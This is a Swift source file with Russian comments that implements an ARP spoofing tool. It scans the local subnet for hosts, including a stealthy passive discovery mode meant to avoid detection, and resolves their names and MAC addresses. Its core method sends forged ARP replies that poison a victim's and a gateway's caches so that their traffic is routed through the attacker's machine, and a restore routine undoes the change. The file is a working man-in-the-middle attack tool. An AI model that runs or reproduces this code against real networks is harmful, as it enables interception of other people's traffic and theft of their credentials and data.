import Foundation
import CBPF

public enum SpoofError: Error, CustomStringConvertible {
    case resolveFailed(IPv4Address)

    public var description: String {
        switch self {
        case .resolveFailed(let ip): return "Не удалось разрешить MAC для \(ip)"
        }
    }
}

public final class ARPSpoofer {
    public let iface: InterfaceInfo
    public let bpf: BPFDevice

    public init(iface: InterfaceInfo, bpf: BPFDevice) {
        self.iface = iface
        self.bpf = bpf
    }

    /// Разослать ARP-request по всей подсети и собрать ответивших.
    /// Только ARP-обнаружение (без имён) — быстрый список хостов. Рассылаем запросы
    /// и повторяем раунд раз в ~1с, пока собираем ответы.
    public func discoverHosts(duration: TimeInterval = 2.5) -> [Host] {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        let hosts = hostsInSubnet(ip: iface.ip, mask: mask).filter { $0 != iface.ip }
        func probe() {
            for h in hosts {
                let req = buildARPFrame(op: .request,
                                        senderMAC: iface.mac, senderIP: iface.ip,
                                        targetMAC: .zero, targetIP: h,
                                        ethDst: .broadcast, ethSrc: iface.mac)
                try? bpf.send(req)
                usleep(800)
            }
        }
        probe()
        var found = [IPv4Address: MACAddress]()
        let deadline = Date().addingTimeInterval(duration)
        var lastProbe = Date()
        while Date() < deadline {
            for f in bpf.receive(timeoutMS: 150) {
                if let (mac, sip) = parseARPReply(f) { found[sip] = mac }
            }
            if Date().timeIntervalSince(lastProbe) > 1.0 { probe(); lastProbe = Date() }
        }
        return found.sorted { $0.key.hostOrder < $1.key.hostOrder }
            .map { Host(ip: $0.key, mac: $0.value) }
    }

    /// Пассивное («ниндзя») обнаружение: НИ ОДНОГО исходящего кадра. Засеваем
    /// ARP-кэшем ОС (система уже знает соседей — находит и молчащих), затем
    /// дослушиваем широковещательный ARP-трафик. ARP-свипом не светим.
    public func discoverHostsPassive(duration: TimeInterval = 6.0) -> [Host] {
        var found = [IPv4Address: MACAddress]()
        for h in arpCacheHosts() { found[h.ip] = h.mac }  // пассивный засев
        let deadline = Date().addingTimeInterval(duration)
        while Date() < deadline {
            for f in bpf.receive(timeoutMS: 250) {
                if let (mac, ip) = parseARPSender(f), mac != iface.mac {
                    found[ip] = mac
                }
            }
        }
        return found.sorted { $0.key.hostOrder < $1.key.hostOrder }
            .map { Host(ip: $0.key, mac: $0.value) }
    }

    /// Пассивно прочитать ARP-кэш ОС: соседи, с которыми система уже общалась.
    /// Ни одного пакета не отправляется. Свои/служебные записи отфильтрованы.
    public func arpCacheHosts() -> [Host] {
        var buf = [cbpf_arp_entry](repeating: cbpf_arp_entry(), count: 1024)
        let n = Int(cbpf_arp_cache(&buf, Int32(buf.count)))
        guard n > 0 else { return [] }
        var out = [IPv4Address: MACAddress]()
        for i in 0..<n {
            let e = buf[i]
            let ip = IPv4Address(bytes: [e.ip.0, e.ip.1, e.ip.2, e.ip.3])
            let mac = MACAddress(bytes: [e.mac.0, e.mac.1, e.mac.2, e.mac.3, e.mac.4, e.mac.5])
            if mac == iface.mac || ip == iface.ip { continue }       // не мы
            if mac == .broadcast || mac == .zero { continue }        // служебное
            out[ip] = mac
        }
        return out.sorted { $0.key.hostOrder < $1.key.hostOrder }
            .map { Host(ip: $0.key, mac: $0.value) }
    }

    /// Имена для найденных хостов: Bonjour (приоритет) + обратный DNS для безымянных.
    /// Возвращает карту MAC → имя.
    public func resolveNames(for hosts: [Host], duration: TimeInterval = 2.5) -> [MACAddress: String] {
        let bonjour = resolveDeviceNames(duration: duration)
        var names = [MACAddress: String]()
        for h in hosts {
            if let bn = bonjour[h.ip.description] { names[h.mac] = bn }
        }
        let unnamed = hosts.filter { names[$0.mac] == nil }
        if !unnamed.isEmpty {
            let queue = DispatchQueue(label: "netspoof.resolve", attributes: .concurrent)
            let group = DispatchGroup()
            let lock = NSLock()
            var resolved = [MACAddress: String]()
            for h in unnamed {
                group.enter()
                queue.async {
                    let n = hostname(for: h.ip)
                    if let n { lock.lock(); resolved[h.mac] = n; lock.unlock() }
                    group.leave()
                }
            }
            _ = group.wait(timeout: .now() + 1.5)
            lock.lock(); let add = resolved; lock.unlock()
            for (m, n) in add { names[m] = n }
        }
        return names
    }

    /// Полный скан (для CLI): обнаружение + имена.
    public func scan(duration: TimeInterval = 2.5) -> [Host] {
        var hosts = discoverHosts(duration: duration)
        let names = resolveNames(for: hosts, duration: duration)
        for i in hosts.indices {
            if let n = names[hosts[i].mac] { hosts[i].name = n }
        }
        return hosts
    }

    /// Разрешить MAC по IP: шлём request и ждём reply.
    public func resolveMAC(ip: IPv4Address, timeout: TimeInterval = 3.0) throws -> MACAddress {
        let req = buildARPFrame(op: .request,
                                senderMAC: iface.mac, senderIP: iface.ip,
                                targetMAC: .zero, targetIP: ip,
                                ethDst: .broadcast, ethSrc: iface.mac)
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            try bpf.send(req)
            for f in bpf.receive(timeoutMS: 300) {
                if let (mac, sip) = parseARPReply(f), sip == ip {
                    return mac
                }
            }
        }
        throw SpoofError.resolveFailed(ip)
    }

    /// Разослать ARP-request по всей подсети без ожидания ответа (быстрый burst).
    /// Ответы подхватит внешний цикл чтения — не блокирует.
    public func probeSubnet() {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        for h in hostsInSubnet(ip: iface.ip, mask: mask) where h != iface.ip {
            let req = buildARPFrame(op: .request,
                                    senderMAC: iface.mac, senderIP: iface.ip,
                                    targetMAC: .zero, targetIP: h,
                                    ethDst: .broadcast, ethSrc: iface.mac)
            try? bpf.send(req)
        }
    }

    /// Найти текущий IP для MAC: разослать ARP-request по подсети и поймать ответ
    /// именно от нужного MAC. Нужно, чтобы привязывать цель к MAC, а не к IP.
    public func resolveIP(forMAC mac: MACAddress, timeout: TimeInterval = 3.0) -> IPv4Address? {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        for h in hostsInSubnet(ip: iface.ip, mask: mask) where h != iface.ip {
            let req = buildARPFrame(op: .request,
                                    senderMAC: iface.mac, senderIP: iface.ip,
                                    targetMAC: .zero, targetIP: h,
                                    ethDst: .broadcast, ethSrc: iface.mac)
            try? bpf.send(req)
            usleep(1200)
        }
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            for f in bpf.receive(timeoutMS: 200) {
                if let (m, ip) = parseARPSender(f), m == mac { return ip }
            }
        }
        return nil
    }

    /// Одна итерация отравления: сообщаем жертве, что gatewayIP — на нашем MAC
    /// (и симметрично шлюзу про жертву, если не oneway).
    public func poisonOnce(victimIP: IPv4Address, victimMAC: MACAddress,
                           gatewayIP: IPv4Address, gatewayMAC: MACAddress,
                           oneway: Bool) {
        let toVictim = buildARPFrame(op: .reply,
                                     senderMAC: iface.mac, senderIP: gatewayIP,
                                     targetMAC: victimMAC, targetIP: victimIP,
                                     ethDst: victimMAC, ethSrc: iface.mac)
        try? bpf.send(toVictim)

        if !oneway {
            let toGateway = buildARPFrame(op: .reply,
                                          senderMAC: iface.mac, senderIP: victimIP,
                                          targetMAC: gatewayMAC, targetIP: gatewayIP,
                                          ethDst: gatewayMAC, ethSrc: iface.mac)
            try? bpf.send(toGateway)
        }
    }

    /// Восстановить настоящие ARP-соответствия у обеих сторон.
    public func restore(victimIP: IPv4Address, victimMAC: MACAddress,
                        gatewayIP: IPv4Address, gatewayMAC: MACAddress,
                        times: Int = 5) {
        for _ in 0..<times {
            let toVictim = buildARPFrame(op: .reply,
                                         senderMAC: gatewayMAC, senderIP: gatewayIP,
                                         targetMAC: victimMAC, targetIP: victimIP,
                                         ethDst: victimMAC, ethSrc: gatewayMAC)
            try? bpf.send(toVictim)

            let toGateway = buildARPFrame(op: .reply,
                                          senderMAC: victimMAC, senderIP: victimIP,
                                          targetMAC: gatewayMAC, targetIP: gatewayIP,
                                          ethDst: gatewayMAC, ethSrc: victimMAC)
            try? bpf.send(toGateway)
            usleep(200_000)
        }
    }
}
